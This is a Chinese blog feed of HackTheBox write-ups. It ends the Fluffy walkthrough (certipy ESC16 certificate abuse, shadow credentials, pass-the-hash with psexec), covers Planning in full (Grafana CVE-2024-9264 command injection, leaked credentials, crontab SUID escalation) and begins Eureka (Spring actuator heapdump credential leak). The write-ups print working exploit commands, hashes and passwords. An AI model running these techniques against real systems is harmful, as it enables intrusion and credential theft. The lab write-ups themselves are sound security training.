感觉还是要拿 `CA_SVC` 用户进行一些攻击，例如 `ADCS` 攻击，因为它是 `CA` 服务用户

使用 `certipy` （这里需要对`certipy`进行更新，在这里卡了很久，愣是找不到攻击路径）枚举可能的漏洞信息

```bash
➜ certipy find -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable     
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250525110326_Certipy.txt'
[*] Wrote text output to '20250525110326_Certipy.txt'
[*] Saving JSON output to '20250525110326_Certipy.json'
[*] Wrote JSON output to '20250525110326_Certipy.json'

```

存在 `ESC16`

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png)

### ESC16

利用链接：https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

影子用户获取 `CA_SVC` 的 `NT hash` 

```bash
➜ certipy shadow auto -username "p.agila@fluffy.htb" -p "prometheusx-303" -account CA_SVC -dc-ip 10.10.11.69
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7f0851e9-35c3-eccb-fd92-b35465aa5f94'
[*] Adding Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

下面跟着利用链接的做即可

```bash
➜ certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-25T14:57:02+00:00
```

```bash
➜ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'

```

```bash
➜ certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 43
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
➜ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

```bash
➜ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69                                                                                                   
Certipy v5.0.2 - by Oliver Lyak (ly4k)      
                                                                                                                                                                                                                  
[*] Certificate identities:                                                                                                                                                                                       
[*]     SAN UPN: 'administrator@fluffy.htb'                                                              
[*] Using principal: 'administrator@fluffy.htb'                                                                                                                                                                   
[*] Trying to get TGT...                                                                                                                                                                                          
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache' 
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

```bash
➜ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.69.....
[*] Found writable share ADMIN$
[*] Uploading file VJlmOeTb.exe
[*] Opening SVCManager on 10.10.11.69.....
[*] Creating service trya on 10.10.11.69.....
[*] Starting service trya.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

```bash
C:\Users\Administrator\Desktop> type root.txt
03337de6b0f0f5188a76c3970006b97b
```

## 总结

CVE-2025-24071，ADCS，ESC16，NTLM 中继]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>ESC16</category>
            <category>Responder</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Planning]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning</guid>
            <pubDate>Sun, 11 May 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Planning https://app.hackthebox.com/machines/Planning | Esay 前期踩点 收集到一个邮箱 info@planning.htb Web 渗透 信息收集 访问 HTTP 服务，采集指纹 可能有用的三个用户名 Bob Moss Ro...]]></description>
            <content:encoded><![CDATA[
# Machine - Planning

> https://app.hackthebox.com/machines/Planning | `Esay`
> 

## 前期踩点

```bash
➜  Planning nmap -sT -min-rate 10000 -p- 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:56 EDT
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.19s latency).
Not shown: 65269 filtered tcp ports (no-response), 264 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 50.82 seconds
```

```bash
➜  Planning nmap -sU -min-rate 5000 -p- 10.10.11.68                                                                                                                                                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 01:01 EDT
Warning: 10.10.11.68 giving up on port because retransmission cap hit (10).
Nmap scan report for planning.htb (10.10.11.68)
Host is up (4.5s latency).
All 65535 scanned ports on planning.htb (10.10.11.68) are in ignored states.
Not shown: 65443 open|filtered udp ports (no-response), 92 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 176.18 seconds
```

```bash
➜  Planning nmap -sT -A -T4 -O -p 22,80 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:59 EDT
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   221.80 ms 10.10.16.1
2   161.43 ms planning.htb (10.10.11.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.81 seconds
```

收集到一个邮箱 `info@planning.htb`

```bash
➜  Planning whatweb planning.htb
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```

## Web 渗透

### 信息收集

访问 `HTTP` 服务，采集指纹

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image.png)

可能有用的三个用户名 `Bob Moss` `Rose Mary` `Stella Haks`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image1.png)

`Detail.php` 页面可以注册，但是貌似没什么用

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image2.png)

目录扫描

```bash
➜  Planning dirsearch -u http://planning.htb -x 404,429 -e php,zip,txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/Planning/reports/http_planning.htb/_25-05-11_01-14-34.txt

Target: http://planning.htb/

[01:14:34] Starting: 
[01:14:51] 200 -   12KB - /about.php
[01:15:12] 200 -   10KB - /contact.php
[01:15:13] 301 -  178B  - /css  ->  http://planning.htb/css/
[01:15:24] 301 -  178B  - /img  ->  http://planning.htb/img/
[01:15:27] 301 -  178B  - /js  ->  http://planning.htb/js/
[01:15:27] 403 -  564B  - /js/
[01:15:29] 301 -  178B  - /lib  ->  http://planning.htb/lib/
[01:15:29] 403 -  564B  - /lib/
```

爆破一下子域名

```bash
➜  Planning wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H 'Host:FUZZ.planning.htb'                                                                               
********************************************************                                                                                                                                                                            
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                                            
********************************************************                                                                                                                                                                            
                                                                                                                                                                                                                                    
Target: http://planning.htb/                                                                                                                                                                                                        
Total requests: 100000                                                                                                                                                                                                              
                                                                                                                                                                                                                                    
=====================================================================                                                                                                                                                               
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================    
000024093:   302        2 L      2 W        29 Ch       "grafana"    
```

能找到叫 `grafana` 的子域名，添加到 `hosts` 文件

访问一下，版本是 `Grafana v11.0.0 (83b9528bce)`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image3.png)

### Grafana

> Grafana 是一个开源的度量分析和可视化工具，支持多种数据源如 Graphite、InfluxDB 等。安装完成后，Grafana 的默认用户名和密码都是***admin***
> 

尝试下默认密码，是失败的

找一下版本相关漏洞

1. https://github.com/nollium/CVE-2024-9264 可以进行 LFI 和 RCE ，但是要验证后
2. https://grafana.com/blog/2024/08/14/grafana-security-release-medium-severity-security-fix-for-cve-2024-6837/ XSS 漏洞

然后发现：

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image4.png)

```bash
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
```

得到密码 `admin`/`0D5oT70Fq13EvB5r`

尝试利用 `CVE-2024-9264`

```bash
(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb
```

成功利用

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image5.png)

```bash
(Planning) ➜  CVE-2024-9264 git:(main) ✗ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root
```

我们在 Docker 环境中

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image6.png)

进行反弹 `shell`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image7.png)

## Docker 逃逸

反弹 `shell` 后对 `shell` 进行优化 ：https://www.sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/

在 `env` 命令输出中，能找到 

```bash
root@7ce659d667d7:~# env    
...      
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
...
```

尝试用改凭据进行 SSH 登录

```bash
➜  Planning ssh enzo@planning.htb 
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 11 06:26:45 AM UTC 2025

  System load:           0.13
  Usage of /:            77.6% of 6.30GB
  Memory usage:          43%
  Swap usage:            16%
  Processes:             294
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4d58

  => There are 43 zombie processes.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May 11 06:27:42 2025 from 10.10.16.12
enzo@planning:~$ 
```

成功进入…

## 提权 - To Root

### 信息收集

在当前目录下可以找到 `user.txt`

```bash
enzo@planning:~$ cat user.txt 
97cbc3d1ee1c848ab5255a90dc366206
```

上传 `Linpeas` 收集信息

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 19K Dec  2 11:59 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 335K Apr 22 11:51 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 39K Dec  5 02:26 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 51K Dec  5 02:26 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 272K Apr  8  2024 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  8  2024 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 55K Dec  5 02:26 /usr/bin/su
-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 1.4M May 11 04:23 /tmp/bash
```

```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:37777         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

注意到很多只有本机开放的端口，3000 是 Grafana，`8000` 不清楚

将 `8000`端口转发出去

```bash
enzo@planning:/tmp$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &
[1] 2124
```

需要账号密码，`enzo`的凭据不正确

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image8.png)

回到 enzo 中再寻找一下信息

在 `/opt/crontabs` 找到 `crontab.db`  

```bash
enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

这些是计划任务

```bash
# Grafana Docker 镜像备份，每天 00:00 执行
0 0 * * * root /usr/bin/docker save root_grafana -o /var/backups/grafana.tar \
  && /usr/bin/gzip /var/backups/grafana.tar \
  && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz \
  && rm /var/backups/grafana.tar.gz
```

```bash
# 每分钟运行一次清理脚本
* * * * * root /root/scripts/cleanup.sh
```

其中 `Grafana Docker` 计划任务中能得到一个密码 `P4ssw0rdS0pRi0T3c`

我们到 `Web` 上尝试使用该密码进行登录，最后使用 `root:P4ssw0rdS0pRi0T3c` 成功进入后台

### Crontab 提权

后台是 `Crontab UI`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image9.png)

我们看到上面的计划任务是以 `root` 执行的，然后我们可以在这里新建计划任务（这里方法很多了，随便 root）

直接进行反弹 `shell` （失败）

给 `/bin/bash` 设置 `sid`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image10.png)

获取 Root

```bash
enzo@planning:/opt/crontabs$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
enzo@planning:/opt/crontabs$ /bin/bash -p
bash-5.2# id
uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
bash-5.2# cd /root
bash-5.2# ls
root.txt  scripts
bash-5.2# cat root.txt 
4f1ad996a454ef10623bfb578c0134ba
```

## 总结

打的糊里糊涂的，并不算难。但是凭据放在 **Machine Information** 里面我是真想不到…

每个点都感觉没有串联起来，割裂感严重。]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux靶机</category>
            <category>Grafana</category>
            <category>Crontab</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Eureka]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka</guid>
            <pubDate>Mon, 28 Apr 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Eureka https://app.hackthebox.com/machines/Eureka | Hard PS：尤里卡发动！所有奇观建造提速 30% ! 前期踩点 Web 渗透 信息收集 WhatWeb 页面上的一些操作要进行登陆后才能进行操作 抓个包分析一下框架 nginx...]]></description>
            <content:encoded><![CDATA[# Machine - Eureka

> https://app.hackthebox.com/machines/Eureka | `Hard`
> 

PS：尤里卡发动！所有奇观建造提速 30% !

## 前期踩点

```bash
➜  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT
Nmap scan report for 10.10.11.66
Host is up (0.15s latency).
Not shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
➜  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT
Nmap scan report for eureka.htb (10.10.11.66)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   442.32 ms 10.10.16.1
2   139.60 ms eureka.htb (10.10.11.66)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.95 seconds
```

## Web 渗透

### 信息收集

WhatWeb

```bash
➜  Eureka whatweb furni.htb                                                                             
http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image.png)

页面上的一些操作要进行登陆后才能进行操作

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image1.png)

抓个包分析一下框架

```bash
➜  Eureka curl -i http://furni.htb                                                                                                                                                                                                  
HTTP/1.1 200 OK                                                                                                                                                                                                                     
Server: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       
Date: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 
Content-Type: text/html;charset=UTF-8                                                                                                                                                                                               
Transfer-Encoding: chunked                                                                                                                                                                                                          
Connection: keep-alive                                                                                                                                                                                                              
Vary: Origin                                                                                                                                                                                                                        
Vary: Access-Control-Request-Method                                                                                                                                                                                                 
Vary: Access-Control-Request-Headers                                                                                                                                                                                                
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US
```

**nginx** 是前端 Web Server（反代或直接服务）。

**Content-Type 是 text/html;charset=UTF-8**，一般就是标准网页。

**X-Content-Type-Options: nosniff** 和 **X-Frame-Options: DENY** 这些是常见的安全 HTTP 头，一般 Java、Spring Boot、或者 ASP.NET Core 这种现代后端框架会加上这些头。

**Cache-Control: no-cache, no-store, max-age=0, must-revalidate**，这种强制禁止缓存的策略，也常见于 **Spring Boot**，尤其是默认模板生成的网站。

再加上 `Content-Language: en-US`，和 `Pragma: no-cache` 这种写法，也很像 Java 系列应用。

**所以，综合来看，后端很可能是 Java 系的框架，极有可能是**：**Spring Boot**

---

目录扫描也确定了这一点，扫描出来了`/actuator` 目录，并且返回 200

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image2.png)

### Spring acturtor 未授权

存在未授权访问

```bash
curl http://furni.htb/actuator/env
```

能发现网站根目录：`/var/www/web/Furni`

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image3.png)

并且目录扫描中还从扫描出来了 `/actuator/heapdump` （`Heap dump` 为渗透测试者提供了对内存中所有对象的可视化访问，是发现和验证敏感信息泄露、业务逻辑缺陷及内存破坏漏洞的重要手段。）

```bash
[03:08:56] 200 -   76MB - /actuator/heapdump
```

```bash
➜  Eureka curl http://furni.htb/actuator/heapdump --output heapdump 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k
```

使用 工具对其进行分析

```bash
➜  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                       
===========================================                                                                                                                                                                                         
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190
===========================================
HikariDataSource
-------------
java.lang.NumberFormatException: Cannot parse null string 
===========================================
OriginTrackedMapPropertySource
-------------                  
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native   
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc           
spring.jpa.hibernate.ddl-auto = none
-------------                                                
UserPassSearcher                           
.... many Message ....
```

喂给GPT上进行分析，其中最关键的信息是：

```bash
username = oscar190  
password = 0sc@r190_S0l!dP@sswd  
url      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  
```

| 配置项 | 含义 | 安全影响／风险 |
| --- | --- | --- |
| `management.endpoints.web.exposure.include = *` | Actuator 暴露所有管理端点（包括 `/heapdump`, `/env`, `/beans` 等） | **高危**：攻击者可访问任意管理端点，下载堆快照、查看环境变量、动态修改日志级别，甚至执行敏感操作。 |
| `spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver` | JDBC 驱动类，使用 MySQL Connector/J | 无直接风险，但表明后续 URL、凭据可用于 MySQL 连接。 |
| `spring.cloud.inetutils.ignoredInterfaces = enp0s.*` | Spring Cloud InetUtils 忽略以 `enp0s.*` 命名的网络接口 | 较低风险；影响服务注册时记录的 IP，与实际可达 IP 可能不一致。 |
| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka 客户端注册中心地址，包含明文用户名和密码 | **高危**：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。 |
| `server.forward-headers-strategy = native` | 代理环境下转发 HTTP 头（如 X-Forwarded-*） | 较低风险；可能影响日志中记录的真实客户端 IP，但对渗透价值有限。 |
| `spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB` | JDBC 连接 URL，指向本地 MySQL 数据库 | 已结合凭据可直接连接数据库，若数据库允许运行外部连接，可远程利用。 |
| `spring.application.name = Furni` | 应用在 Eureka 或其他注册中心中的名称 | 低风险；可用于识别服务拓扑，但对攻击无直接帮助。 |
| `server.port = 8082` | 应用监听的 HTTP 端口 | 揭示可访问的端口，渗透测试时可针对该端口进行探测与攻击。 |
